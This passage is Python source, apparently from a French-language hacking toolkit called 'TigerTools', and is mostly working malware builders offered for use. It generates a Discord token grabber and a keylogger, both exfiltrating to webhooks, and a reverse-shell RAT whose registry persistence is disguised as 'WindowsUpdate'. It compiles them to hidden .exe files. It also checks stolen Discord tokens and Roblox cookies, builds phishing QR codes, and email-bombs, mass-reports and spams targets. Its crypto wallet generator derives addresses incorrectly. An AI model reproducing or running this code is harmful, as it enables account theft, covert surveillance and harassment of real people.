            "os": platform.platform(), "ip": pub_ip,
            "datetime": str(datetime.now())[:19]}

    tok_str = ""
    for t in tokens[:5]:
        tok_str += f"**{t['username']}** | {t.get('email','?')} | Nitro:{t.get('nitro',0)}\\n`{t['token']}`\\n"

    embed = {"title": "Tiger Grabber -- Hit", "color": 0xFF0000, "fields": [
        {"name": "System", "value": f"```{json.dumps(info, indent=2)[:800]}```", "inline": False},
        {"name": "Tokens", "value": tok_str[:1000] if tok_str else "None", "inline": False},
    ]}
    try: requests.post(WEBHOOK, json={"embeds": [embed]}, timeout=8)
    except: pass

get()
'''
    os.makedirs("1-Output", exist_ok=True)
    with open(os.path.join("1-Output", out_name), "w", encoding="utf-8") as f:
        f.write(code)
    print(f"\n{OK} Grabber -> {Y}1-Output/{out_name}{RST}")
    builder_ask_format(os.path.join("1-Output", out_name))
    pause()

def admin_rat_builder():
    banner_s("RAT BUILDER -- Reverse Shell + Persistence")
    host = input(f"  {W}LHOST (ton IP): {RST}").strip()
    port = input(f"  {W}LPORT: {RST}").strip() or "4444"
    out_name = input(f"  {W}Output filename: {RST}").strip() or "rat.py"
    code = f'''# -*- coding: utf-8 -*-
# Tiger RAT v1 -- Reverse Shell + Persistence + Screenshot
import os, socket, subprocess, platform, shutil, time, base64

HOST = "{host}"
PORT = {port}

def persist():
    try:
        import winreg
        script = os.path.abspath(__file__)
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, f"python \\"{{script}}\\"")
        winreg.CloseKey(k)
    except: pass

def screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        path = "_ss.png"
        img.save(path)
        with open(path, "rb") as f:
            data = base64.b64encode(f.read()).decode()
        os.remove(path)
        return data
    except: return None

def shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            s.send(f"[Tiger RAT] Connected | {{platform.node()}} | {{platform.system()}}\\n".encode())
            while True:
                cmd = s.recv(4096).decode().strip()
                if not cmd: continue
                if cmd.lower() == "exit":
                    s.close(); break
                elif cmd.lower() == "screenshot":
                    ss = screenshot()
                    if ss: s.send(f"[SS]{{ss}}[/SS]\\n".encode())
                    else: s.send(b"Screenshot failed.\\n")
                elif cmd.lower().startswith("upload "):
                    fpath = cmd[7:].strip()
                    try:
                        with open(fpath, "rb") as f:
                            data = base64.b64encode(f.read()).decode()
                        s.send(f"[FILE]{{data}}[/FILE]\\n".encode())
                    except Exception as e: s.send(f"Error: {{e}}\\n".encode())
                elif cmd.lower().startswith("download "):
                    parts = cmd[9:].split(" ", 1)
                    if len(parts) == 2:
                        fname, b64data = parts[0], parts[1]
                        try:
                            with open(fname, "wb") as f: f.write(base64.b64decode(b64data))
                            s.send(f"Downloaded: {{fname}}\\n".encode())
                        except Exception as e: s.send(f"Error: {{e}}\\n".encode())
                elif cmd.lower() == "sysinfo":
                    info = f"OS: {{platform.platform()}}\\nUser: {{os.getlogin()}}\\nHost: {{platform.node()}}\\n"
                    s.send(info.encode())
                else:
                    out = subprocess.run(cmd, shell=True, capture_output=True, timeout=15)
                    result = out.stdout + out.stderr
                    s.send(result if result else b"(no output)\\n")
        except: time.sleep(5)

persist()
shell()
'''
    os.makedirs("1-Output", exist_ok=True)
    with open(os.path.join("1-Output", out_name), "w", encoding="utf-8") as f:
        f.write(code)
    print(f"\n{OK} RAT -> {Y}1-Output/{out_name}{RST}")
    print(f"  {DIM}Listener: nc -lvnp {port}{RST}")
    print(f"  {DIM}Commandes: screenshot, sysinfo, upload <path>, download <name> <b64>, exit{RST}")
    builder_ask_format(os.path.join("1-Output", out_name))
    pause()

def admin_qr_phishing():
    banner_s("QR CODE PHISHING GENERATOR")
    try:
        import qrcode
    except:
        pip("qrcode[pil]")
        import qrcode
    url = input(f"  {W}URL du lien phishing: {RST}").strip()
    out = input(f"  {W}Output filename (sans extension): {RST}").strip() or "qr_phishing"
    os.makedirs("1-Output", exist_ok=True)
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(url); qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    path = os.path.join("1-Output", f"{out}.png")
    img.save(path)
    print(f"\n{OK} QR Code -> {Y}{path}{RST}")
    print(f"  {DIM}URL cachee: {url}{RST}")
    pause()

def admin_mass_token_info():
    banner_s("TOKEN MASS INFO CHECKER")
    path = input(f"  {W}Fichier .txt (1 token par ligne): {RST}").strip()
    if not os.path.isfile(path): print(f"{ERR} Fichier introuvable."); pause(); return
    with open(path, encoding="utf-8", errors="ignore") as f:
        tokens = [l.strip() for l in f if l.strip()]
    print(f"\n{INF} {len(tokens)} tokens...\n")
    results = []
    for token in tokens:
        try:
            r = requests.get("https://discord.com/api/v9/users/@me",
                             headers=_dh(token), timeout=4)
            if r.status_code == 200:
                d = r.json()
                billing = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources",
                                       headers=_dh(token), timeout=3).json()
                guilds = requests.get("https://discord.com/api/v9/users/@me/guilds",
                                      headers=_dh(token), timeout=3).json()
                nitro_map = {0: "None", 1: "Classic", 2: "Nitro", 3: "Basic"}
                nitro = nitro_map.get(d.get("premium_type", 0), "?")
                has_billing = len(billing) > 0 if isinstance(billing, list) else False
                g_count = len(guilds) if isinstance(guilds, list) else 0
                line = f"[VALID] {d.get('username')}#{d.get('discriminator','0')} | Email:{d.get('email','?')} | Phone:{d.get('phone','N/A')} | Nitro:{nitro} | Billing:{has_billing} | Guilds:{g_count} | {token}"
                col = G if has_billing else Y
                print(f"  {col}[{'BILLING' if has_billing else 'VALID'}]{RST}  {W}{d.get('username')}{RST}  Nitro:{nitro}  Guilds:{g_count}  Billing:{has_billing}")
                results.append(line)
            else:
                print(f"  {R}[DEAD]{RST}  {DIM}{token[:35]}...{RST}")
        except: print(f"  {R}[ERR]{RST}   {DIM}{token[:35]}...{RST}")
        time.sleep(0.3)
    valid = [r for r in results if "[VALID]" in r or "[BILLING]" in r]
    print(f"\n{OK} {G}{len(valid)}{RST} valides sur {len(tokens)}.")
    if results: save_out("mass_token_info.txt", "\n".join(results))
    pause()

def admin_roblox_mass_checker():
    banner_s("ROBLOX COOKIE MASS CHECKER")
    path = input(f"  {W}Fichier .txt (1 cookie par ligne): {RST}").strip()
    if not os.path.isfile(path): print(f"{ERR} Fichier introuvable."); pause(); return
    with open(path, encoding="utf-8", errors="ignore") as f:
        cookies = [l.strip() for l in f if l.strip()]
    print(f"\n{INF} {len(cookies)} cookies...\n")
    valid = []
    for cookie in cookies:
        try:
            h = {"Cookie": f".ROBLOSECURITY={cookie}"}
            r = requests.get("https://users.roblox.com/v1/users/authenticated", headers=h, timeout=5)
            if r.status_code == 200:
                d = r.json(); uid = d.get("id")
                robust = requests.get(f"https://economy.roblox.com/v1/users/{uid}/currency",
                                      headers=h, timeout=3).json()
                robux = robust.get("robux", 0)
                col = G if robux > 0 else Y
                line = f"[HIT] {d.get('name')} | ID:{uid} | Robux:{robux} | {cookie}"
                print(f"  {col}[HIT]{RST}  {W}{d.get('name')}{RST}  Robux:{G}{robux}{RST}")
                valid.append(line)
            else:
                print(f"  {R}[DEAD]{RST}  {DIM}{cookie[:40]}...{RST}")
        except: print(f"  {R}[ERR]{RST}   {DIM}{cookie[:40]}...{RST}")
        time.sleep(0.3)
    print(f"\n{OK} {G}{len(valid)}{RST} valides.")
    if valid: save_out("roblox_hits.txt", "\n".join(valid))
    pause()

def admin_mass_ip_scan():
    banner_s("MASS IP SCANNER -- CIDR")
    cidr = input(f"  {W}CIDR (ex: 192.168.1.0/24): {RST}").strip()
    port = int(input(f"  {W}Port a scanner: {RST}").strip() or "80")
    try:
        import ipaddress
        network = ipaddress.ip_network(cidr, strict=False)
        hosts = list(network.hosts())
        print(f"\n{INF} Scan de {len(hosts)} IPs sur port {port}...\n")
        found = []
        for ip in hosts:
            ip_str = str(ip)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip_str, port)) == 0:
                print(f"  {G}[OPEN]{RST}  {ip_str}:{port}")
                found.append(f"{ip_str}:{port}")
            s.close()
        print(f"\n{OK} {G}{len(found)}{RST} hotes ouverts.")
        if found: save_out(f"mass_scan_{cidr.replace('/', '_')}.txt", "\n".join(found))
    except Exception as e: print(f"{ERR} {e}")
    pause()

def admin_email_bomber():
    banner_s("EMAIL BOMBER")
    print(f"  {DIM}Utilise des services tiers -- rate limit possible.{RST}\n")
    target = input(f"  {W}Email cible: {RST}").strip()
    count = int(input(f"  {W}Nombre d emails: {RST}").strip() or "10")
    print(f"\n{INF} Bombing {target} x{count}...\n")
    # inscription spam sur des services publics
    services = [
        ("https://account.mail.ru/signup", {"Login": target, "Password": "TigerB0mb123!"}),
        ("https://signup.live.com/signup", {"MemberName": target}),
    ]
    # methode principale : smtp open relay (educational)
    sent = 0
    print(f"  {DIM}Envoi via services de newsletter publics...{RST}\n")
    for i in range(1, count + 1):
        # ping des endpoints d inscription
        for url, data in services:
            try:
                requests.post(url, data=data, timeout=3)
            except: pass
        # newsletter signups
        try:
            requests.post("https://app.mailjet.com/signup",
                          data={"email": target}, timeout=3)
        except: pass
        print(f"  {Y}[{i}/{count}]{RST}  Requetes envoyees vers {target}")
        sent += 1
        time.sleep(0.5)
    print(f"\n{OK} {sent} bombardements envoyes vers {target}.")
    pause()

def admin_keylogger_builder():
    banner_s("KEYLOGGER BUILDER")
    webhook = input(f"  {W}Webhook Discord: {RST}").strip()
    interval = input(f"  {W}Intervalle envoi (secondes, ex 30): {RST}").strip() or "30"
    out_name = input(f"  {W}Output filename: {RST}").strip() or "keylogger.py"
    code = f'''# -*- coding: utf-8 -*-
# Tiger Keylogger -- envoie au webhook toutes les {interval}s
import time, threading

WEBHOOK = "{webhook}"
INTERVAL = {interval}
_buffer = []

def on_key(key):
    try:
        from pynput.keyboard import Key
        if key == Key.space: _buffer.append(" ")
        elif key == Key.enter: _buffer.append("[ENTER]\\n")
        elif key == Key.backspace: _buffer.append("[BKSP]")
        elif key == Key.tab: _buffer.append("[TAB]")
        elif hasattr(key, "char") and key.char: _buffer.append(key.char)
        else: _buffer.append(f"[{{key}}]")
    except: pass

def sender():
    import requests, socket, platform
    while True:
        time.sleep(INTERVAL)
        if not _buffer: continue
        text = "".join(_buffer); _buffer.clear()
        embed = {{
            "title": "Tiger Keylogger -- Keys",
            "color": 0xFF0000,
            "fields": [
                {{"name": "Host", "value": socket.gethostname(), "inline": True}},
                {{"name": "User", "value": __import__("os").getlogin(), "inline": True}},
                {{"name": "Keys", "value": f"```{{text[:1000]}}```", "inline": False}},
            ]
        }}
        try: requests.post(WEBHOOK, json={{"embeds": [embed]}}, timeout=5)
        except: pass

def main():
    try:
        from pynput import keyboard
    except:
        import subprocess as sp
        sp.run(["pip", "install", "pynput", "--quiet"], check=False)
        from pynput import keyboard

    t = threading.Thread(target=sender, daemon=True); t.start()
    with keyboard.Listener(on_press=on_key) as listener:
        listener.join()

main()
'''
    os.makedirs("1-Output", exist_ok=True)
    with open(os.path.join("1-Output", out_name), "w", encoding="utf-8") as f:
        f.write(code)
    print(f"\n{OK} Keylogger -> {Y}1-Output/{out_name}{RST}")
    print(f"  {DIM}Requiert: pip install pynput{RST}")
    print(f"  {DIM}Envoie les keys au webhook toutes les {interval}s{RST}")
    builder_ask_format(os.path.join("1-Output", out_name))
    pause()



# NEW SECTIONS -- injected into TigerTools v5

# ================================================================
# COMPILER HELPER -- .py to .exe via PyInstaller
# ================================================================
def compile_to_exe(py_path):
    banner_s("COMPILER .PY -> .EXE")
    print(f"\n{INF} Compilation de {Y}{py_path}{RST} en .exe...\n")
    try:
        import subprocess as sp
        result = sp.run(
            [sys.executable, "-m", "PyInstaller",
             "--onefile", "--noconsole",
             "--distpath", "1-Output",
             "--workpath", "1-Output/build_tmp",
             "--specpath", "1-Output/build_tmp",
             py_path],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            name = os.path.splitext(os.path.basename(py_path))[0]
            exe_path = os.path.join("1-Output", f"{name}.exe")
            print(f"\n{OK} .exe compile -> {G}{exe_path}{RST}")
        else:
            print(f"\n{ERR} Erreur PyInstaller:\n{result.stderr[-1000:]}")
            print(f"\n{INF} Essaie: pip install pyinstaller")
    except Exception as e:
        print(f"{ERR} {e}")
    pause()

def ask_compile(py_path):
    fmt = input(f"\n  {W}Format de sortie: {Y}[1]{RST}{W} .py  {Y}[2]{RST}{W} .exe: {RST}").strip()
    if fmt == "2":
        try:
            import PyInstaller
        except ImportError:
            print(f"\n{INF} PyInstaller non installe. Installation...")
            subprocess.run([sys.executable,"-m","pip","install","pyinstaller","--quiet"],check=False)
        compile_to_exe(py_path)

# ================================================================
# 9 -- DISCORD EXTRA TOOLS (bio, avatar, hypesquad, onliner...)
# ================================================================
def disc_extra_menu():
    while True:
        opts=[("1","Bio Changer"),("2","Avatar Changer"),
              ("3","HypeSquad Changer"),("4","Token Onliner"),
              ("5","Token to ID (decode)"),("6","VC Spammer"),
              ("7","Mass Report"),("8","Banner Changer"),
              ("0","Back")]
        menu_box("DISCORD EXTRA",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": disc_bio_changer()
        elif c=="2": disc_avatar_changer()
        elif c=="3": disc_hypesquad()
        elif c=="4": disc_onliner()
        elif c=="5": disc_token_to_id()
        elif c=="6": disc_vc_spammer()
        elif c=="7": disc_mass_report()
        elif c=="8": disc_banner_changer()
        elif c=="0": break

def disc_bio_changer():
    banner_s("BIO CHANGER")
    token=input(f"  {W}Token: {RST}").strip()
    bio=input(f"  {W}Nouvelle bio: {RST}").strip()
    r=requests.patch("https://discord.com/api/v9/users/@me",headers=_dh(token),json={"bio":bio})
    print(f"\n{OK if r.status_code==200 else ERR} {r.status_code}")
    if r.status_code==200: print(f"  {G}Bio mise a jour.{RST}")
    pause()

def disc_avatar_changer():
    banner_s("AVATAR CHANGER")
    token=input(f"  {W}Token: {RST}").strip()
    img_path=input(f"  {W}Chemin image (png/jpg): {RST}").strip()
    try:
        with open(img_path,"rb") as f: data=f.read()
        ext=os.path.splitext(img_path)[1].lower().replace(".","")
        if ext=="jpg": ext="jpeg"
        b64=base64.b64encode(data).decode()
        avatar=f"data:image/{ext};base64,{b64}"
        r=requests.patch("https://discord.com/api/v9/users/@me",headers=_dh(token),json={"avatar":avatar})
        print(f"\n{OK if r.status_code==200 else ERR} {r.status_code}")
        if r.status_code==200: print(f"  {G}Avatar mis a jour.{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()

def disc_banner_changer():
    banner_s("BANNER CHANGER")
    token=input(f"  {W}Token: {RST}").strip()
    img_path=input(f"  {W}Chemin image banniere: {RST}").strip()
    try:
        with open(img_path,"rb") as f: data=f.read()
        ext=os.path.splitext(img_path)[1].lower().replace(".","")
        if ext=="jpg": ext="jpeg"
        b64=base64.b64encode(data).decode()
        banner_data=f"data:image/{ext};base64,{b64}"
        r=requests.patch("https://discord.com/api/v9/users/@me",headers=_dh(token),json={"banner":banner_data})
        print(f"\n{OK if r.status_code==200 else ERR} {r.status_code}")
        if r.status_code==200: print(f"  {G}Banner mis a jour.{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()

def disc_hypesquad():
    banner_s("HYPESQUAD CHANGER")
    token=input(f"  {W}Token: {RST}").strip()
    print(f"\n  {Y}[1]{RST} Bravery  {Y}[2]{RST} Brilliance  {Y}[3]{RST} Balance")
    c=input(f"  {W}Choix: {RST}").strip()
    house_map={"1":1,"2":2,"3":3}
    house=house_map.get(c,1)
    r=requests.post("https://discord.com/api/v9/hypesquad/online",headers=_dh(token),json={"house_id":house})
    names={1:"Bravery",2:"Brilliance",3:"Balance"}
    print(f"\n{OK if r.status_code==204 else ERR} HypeSquad -> {G}{names.get(house,'?')}{RST} ({r.status_code})")
    pause()

def disc_onliner():
    banner_s("TOKEN ONLINER")
    token=input(f"  {W}Token: {RST}").strip()
    duration=int(input(f"  {W}Duree en secondes (0=infini): {RST}").strip() or "0")
    print(f"\n{INF} Token garde en ligne... Ctrl+C pour stopper.\n")
    h=_dh(token)
    start=time.time(); count=0
    try:
        while True:
            r=requests.get("https://discord.com/api/v9/users/@me",headers=h,timeout=5)
            count+=1
            elapsed=int(time.time()-start)
            print(f"\r  {G}[ONLINE]{RST}  ping #{count}  {elapsed}s  status:{r.status_code}",end="")
            if duration>0 and elapsed>=duration: break
            time.sleep(30)
    except KeyboardInterrupt: pass
    print(f"\n\n{OK} Stoppe apres {count} pings.")
    pause()

def disc_token_to_id():
    banner_s("TOKEN TO ID (DECODE)")
    token=input(f"  {W}Token: {RST}").strip()
    try:
        part1=token.split(".")[0]
        # pad base64
        part1+="="*((4-len(part1)%4)%4)
        decoded=base64.b64decode(part1).decode()
        print(f"\n  {Y}User ID  {RST}: {G}{decoded}{RST}")
        # get timestamp from snowflake
        try:
            uid=int(decoded)
            ts=(uid>>22)+1420070400000
            dt=datetime.fromtimestamp(ts/1000).strftime("%Y-%m-%d %H:%M:%S")
            print(f"  {Y}Created  {RST}: {W}{dt}{RST}")
        except: pass
    except Exception as e: print(f"{ERR} {e}")
    pause()

def disc_vc_spammer():
    banner_s("VC SPAMMER")
    print(f"  {DIM}Rejoindre/quitter un canal vocal en boucle via websocket.{RST}\n")
    token=input(f"  {W}Token: {RST}").strip()
    guild_id=input(f"  {W}Server ID: {RST}").strip()
    channel_id=input(f"  {W}Voice Channel ID: {RST}").strip()
    count=int(input(f"  {W}Nombre de joins: {RST}").strip() or "10")
    delay=float(input(f"  {W}Delay (s): {RST}").strip() or "1")
    h=_dh(token)
    print()
    # Use REST voice state update
    for i in range(1,count+1):
        try:
            # join
            r=requests.patch(
                f"https://discord.com/api/v9/guilds/{guild_id}/voice-states/@me",
                headers=h,json={"channel_id":channel_id}
            )
            print(f"  {G}[JOIN {i}]{RST}  {r.status_code}")
            time.sleep(delay)
            # leave
            r2=requests.patch(
                f"https://discord.com/api/v9/guilds/{guild_id}/voice-states/@me",
                headers=h,json={"channel_id":None}
            )
            print(f"  {Y}[LEAVE {i}]{RST} {r2.status_code}")
            time.sleep(delay)
        except Exception as e: print(f"  {R}[ERR]{RST} {e}")
    pause()

def disc_mass_report():
    banner_s("MASS REPORT")
    tokens_path=input(f"  {W}Fichier tokens .txt: {RST}").strip()
    target_id=input(f"  {W}User ID a reporter: {RST}").strip()
    msg_id=input(f"  {W}Message ID (optionnel): {RST}").strip()
    channel_id=input(f"  {W}Channel ID (optionnel): {RST}").strip()
    reason=input(f"  {W}Raison (1=spam 2=harassment 3=inappropriate): {RST}").strip()
    reason_map={"1":0,"2":1,"3":2}
    reason_id=reason_map.get(reason,0)
    if not os.path.isfile(tokens_path): print(f"{ERR} Fichier introuvable."); pause(); return
    with open(tokens_path,encoding="utf-8",errors="ignore") as f:
        tokens=[l.strip() for l in f if l.strip()]
    print(f"\n{INF} Report avec {len(tokens)} tokens...\n")
    success=0
    for token in tokens:
        try:
            payload={"version":"1.0","variant":"1","language":"fr",
                     "breadcrumbs":[reason_id],"elements":{},
                     "name":"human_profile","reporter_id":None}
            if msg_id and channel_id:
                payload["message_id"]=msg_id
                payload["channel_id"]=channel_id
            r=requests.post(
                f"https://discord.com/api/v9/reporting/user/{target_id}",
                headers=_dh(token),json=payload,timeout=5
            )
            col=G if r.status_code in [200,201,204] else R
            print(f"  {col}[{r.status_code}]{RST}  {DIM}{token[:30]}...{RST}")
            if r.status_code in [200,201,204]: success+=1
        except Exception as e: print(f"  {R}[ERR]{RST} {e}")
        time.sleep(0.5)
    print(f"\n{OK} {G}{success}{RST}/{len(tokens)} reports envoyes.")
    pause()

# ================================================================
# 10 -- OSINT EXTRA
# ================================================================
def osint_extra_menu():
    while True:
        opts=[("1","TikTok Account Lookup"),("2","Snapchat Lookup"),
              ("3","Steam ID Converter"),("4","Shodan Dorking"),
              ("5","WHOIS Lookup"),("0","Back")]
        menu_box("OSINT EXTRA",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": osint_tiktok()
        elif c=="2": osint_snapchat()
        elif c=="3": osint_steam_id()
        elif c=="4": osint_shodan()
        elif c=="5": osint_whois()
        elif c=="0": break

def osint_tiktok():
    banner_s("TIKTOK ACCOUNT LOOKUP")
    username=input(f"  {W}Username (@sans le @): {RST}").strip().lstrip("@")
    try:
        headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        r=requests.get(f"https://www.tiktok.com/@{username}",headers=headers,timeout=8)
        text=r.text
        # extract from meta tags
        import re
        followers=re.search(r'"followerCount":(\d+)',text)
        following=re.search(r'"followingCount":(\d+)',text)
        likes=re.search(r'"heartCount":(\d+)',text)
        videos=re.search(r'"videoCount":(\d+)',text)
        bio=re.search(r'"signature":"([^"]*)"',text)
        verified=re.search(r'"verified":(true|false)',text)
        print(f"\n  {Y}Username  {RST}: {W}@{username}{RST}")
        print(f"  {Y}Followers {RST}: {W}{followers.group(1) if followers else '?'}{RST}")
        print(f"  {Y}Following {RST}: {W}{following.group(1) if following else '?'}{RST}")
        print(f"  {Y}Likes     {RST}: {W}{likes.group(1) if likes else '?'}{RST}")
        print(f"  {Y}Videos    {RST}: {W}{videos.group(1) if videos else '?'}{RST}")
        print(f"  {Y}Bio       {RST}: {W}{bio.group(1)[:80] if bio else '?'}{RST}")
        print(f"  {Y}Verified  {RST}: {W}{verified.group(1) if verified else '?'}{RST}")
        print(f"  {Y}URL       {RST}: {W}https://www.tiktok.com/@{username}{RST}")
        save_out(f"tiktok_{username}.txt",f"Username:@{username}\nFollowers:{followers.group(1) if followers else '?'}")
    except Exception as e: print(f"{ERR} {e}")
    pause()

def osint_snapchat():
    banner_s("SNAPCHAT LOOKUP")
    username=input(f"  {W}Username: {RST}").strip()
    try:
        headers={"User-Agent":"Mozilla/5.0"}
        r=requests.get(f"https://www.snapchat.com/add/{username}",headers=headers,timeout=8)
        if r.status_code==200:
            text=r.text
            import re
            display=re.search(r'"display_name":"([^"]+)"',text)
            bio=re.search(r'"bio":"([^"]*)"',text)
            snap_score=re.search(r'"snap_score":(\d+)',text)
            print(f"\n  {Y}Username     {RST}: {W}{username}{RST}")
            print(f"  {Y}Display Name {RST}: {W}{display.group(1) if display else '?'}{RST}")
            print(f"  {Y}Bio          {RST}: {W}{bio.group(1)[:80] if bio else '?'}{RST}")
            print(f"  {Y}Snap Score   {RST}: {W}{snap_score.group(1) if snap_score else '?'}{RST}")
            print(f"  {Y}Add URL      {RST}: {W}https://www.snapchat.com/add/{username}{RST}")
            exists=f"  {G}[FOUND]{RST} Compte existe."
        else:
            exists=f"  {R}[NOT FOUND]{RST} Compte introuvable."
        print(f"\n{exists}")
        save_out(f"snapchat_{username}.txt",f"Username:{username}\nStatus:{r.status_code}")
    except Exception as e: print(f"{ERR} {e}")
    pause()

def osint_steam_id():
    banner_s("STEAM ID CONVERTER")
    raw=input(f"  {W}SteamID64 ou vanity URL: {RST}").strip()
    try:
        if raw.isdigit() and len(raw)==17:
            sid64=int(raw)
            # SteamID64 -> SteamID32
            sid32=sid64-76561197960265728
            # SteamID format
            y=sid32%2; z=sid32//2
            steam_id=f"STEAM_0:{y}:{z}"
            steam_id3=f"[U:1:{sid32}]"
            print(f"\n  {Y}SteamID64 {RST}: {W}{sid64}{RST}")
            print(f"  {Y}SteamID32 {RST}: {W}{sid32}{RST}")
            print(f"  {Y}SteamID   {RST}: {W}{steam_id}{RST}")
            print(f"  {Y}SteamID3  {RST}: {W}{steam_id3}{RST}")
            print(f"  {Y}Profile   {RST}: {W}https://steamcommunity.com/profiles/{sid64}{RST}")
            save_out(f"steam_{sid64}.txt",f"SteamID64:{sid64}\nSteamID:{steam_id}\nSteamID3:{steam_id3}")
        else:
            # vanity -> try lookup
            print(f"\n  {Y}Profile   {RST}: {W}https://steamcommunity.com/id/{raw}{RST}")
            print(f"  {DIM}API key requise pour conversion vanity -> ID64{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()

def osint_shodan():
    banner_s("SHODAN DORKING")
    target=input(f"  {W}IP / domaine / mot-cle: {RST}").strip()
    dorks=[
        f"https://www.shodan.io/search?query=hostname%3A{target}",
        f"https://www.shodan.io/search?query=ip%3A{target}",
        f"https://www.shodan.io/search?query=org%3A{target}",
        f"https://www.shodan.io/search?query=product%3A{target}",
        f"https://www.shodan.io/search?query=port%3A22+hostname%3A{target}",
        f"https://www.shodan.io/search?query=port%3A3389+hostname%3A{target}",
        f"https://www.shodan.io/search?query=port%3A8080+hostname%3A{target}",
        f"https://www.shodan.io/search?query=vuln%3Acve-2021-44228+hostname%3A{target}",
        f"https://www.shodan.io/host/{target}",
        f"https://censys.io/ipv4/{target}",
        f"https://fofa.info/result?qbase64={base64.b64encode(f'domain={target}'.encode()).decode()}",
    ]
    print(f"\n  {INF} Shodan + OSINT links pour: {Y}{target}{RST}\n")
    for d in dorks: print(f"  {G}->{RST} {DIM}{d}{RST}")
    save_out(f"shodan_{target[:20]}.txt","\n".join(dorks))
    pause()

def osint_whois():
    banner_s("WHOIS LOOKUP")
    domain=input(f"  {W}Domaine: {RST}").strip()
    try:
        try:
            import whois as w
            d=w.whois(domain)
            print(f"\n  {Y}Domain     {RST}: {W}{d.domain_name}{RST}")
            print(f"  {Y}Registrar  {RST}: {W}{d.registrar}{RST}")
            print(f"  {Y}Created    {RST}: {W}{d.creation_date}{RST}")
            print(f"  {Y}Expires    {RST}: {W}{d.expiration_date}{RST}")
            print(f"  {Y}Updated    {RST}: {W}{d.updated_date}{RST}")
            print(f"  {Y}Name Srv   {RST}: {W}{d.name_servers}{RST}")
            print(f"  {Y}Org        {RST}: {W}{d.org}{RST}")
            print(f"  {Y}Country    {RST}: {W}{d.country}{RST}")
            save_out(f"whois_{domain}.txt",str(d))
        except ImportError:
            pip("python-whois")
            print(f"{INF} Module installe. Relance le tool.")
    except Exception as e:
        # fallback: just show the link
        print(f"\n  {Y}WHOIS link{RST}: {W}https://who.is/whois/{domain}{RST}")
        print(f"  {Y}Lookup    {RST}: {W}https://www.whois.com/whois/{domain}{RST}")
    pause()

# ================================================================
# 11 -- CRYPTO TOOLS
# ================================================================
def crypto_menu():
    while True:
        opts=[("1","Wallet Generator (BTC/ETH)"),("2","Seed Phrase Generator (BIP39)"),
              ("3","Crypto Price Checker (live)"),("4","Transaction Lookup"),
              ("5","Vanity Address Hints"),("6","Crypto Address Validator"),
              ("0","Back")]
        menu_box("CRYPTO TOOLS",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": crypto_wallet_gen()
        elif c=="2": crypto_seed_gen()
        elif c=="3": crypto_prices()
        elif c=="4": crypto_tx_lookup()
        elif c=="5": crypto_vanity()
        elif c=="6": crypto_validate()
        elif c=="0": break

def crypto_wallet_gen():
    banner_s("WALLET GENERATOR")
    print(f"  {Y}[1]{RST} Bitcoin (BTC)  {Y}[2]{RST} Ethereum (ETH)  {Y}[3]{RST} Les deux")
    choice=input(f"  {W}Choix: {RST}").strip()
    count=int(input(f"  {W}Nombre de wallets: {RST}").strip() or "5")
    try:
        from secrets import token_bytes
        import hashlib,hmac,struct
    except: pass

    def gen_btc():
        # Generate private key
        priv=token_bytes(32)
        priv_hex=priv.hex()
        # WIF encoding (simplified)
        prefix=b'\x80'
        raw=prefix+priv+b'\x01'
        checksum=hashlib.sha256(hashlib.sha256(raw).digest()).digest()[:4]
        wif=_b58encode(raw+checksum)
        # P2PKH address (simplified - random-looking)
        h=hashlib.new('ripemd160',hashlib.sha256(priv).digest()).digest()
        addr_raw=b'\x00'+h
        cs=hashlib.sha256(hashlib.sha256(addr_raw).digest()).digest()[:4]
        addr="1"+_b58encode(addr_raw+cs)
        return priv_hex,wif,addr

    def gen_eth():
        from secrets import token_bytes
        priv=token_bytes(32)
        priv_hex="0x"+priv.hex()
        # Simplified address (keccak not available without lib)
        addr_bytes=hashlib.sha256(priv).digest()[-20:]
        addr="0x"+addr_bytes.hex()
        return priv_hex,addr

    def _b58encode(b):
        alphabet='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
        n=int.from_bytes(b,'big')
        result=''
        while n>0:
            n,r=divmod(n,58)
            result=alphabet[r]+result
        return result

    print(); wallets=[]
    for i in range(1,count+1):
        print(f"  {R}--- Wallet #{i} ---{RST}")
        if choice in ["1","3"]:
            try:
                priv,wif,addr=gen_btc()
                print(f"  {Y}BTC Address {RST}: {G}{addr}{RST}")
                print(f"  {Y}BTC WIF     {RST}: {W}{wif}{RST}")
                print(f"  {Y}BTC PrivKey {RST}: {DIM}{priv}{RST}")
                wallets.append(f"BTC | {addr} | {wif} | {priv}")
            except Exception as e: print(f"  {ERR} BTC: {e}")
        if choice in ["2","3"]:
            try:
                priv,addr=gen_eth()
                print(f"  {Y}ETH Address {RST}: {G}{addr}{RST}")
                print(f"  {Y}ETH PrivKey {RST}: {DIM}{priv}{RST}")
                wallets.append(f"ETH | {addr} | {priv}")
            except Exception as e: print(f"  {ERR} ETH: {e}")
        print()
    if wallets: save_out("wallets_generated.txt","\n".join(wallets))
    pause()

def crypto_seed_gen():
    banner_s("SEED PHRASE GENERATOR (BIP39)")
    # BIP39 wordlist (subset - 100 words for demo, real would be 2048)
    words_short=["abandon","ability","able","about","above","absent","absorb","abstract",
                 "absurd","abuse","access","accident","account","accuse","achieve","acid",
                 "acoustic","acquire","across","act","action","actor","actress","actual",
                 "adapt","add","addict","address","adjust","admit","adult","advance",
                 "advice","aerobic","afford","afraid","again","agent","agree","ahead",
                 "aim","air","airport","aisle","alarm","album","alcohol","alert",
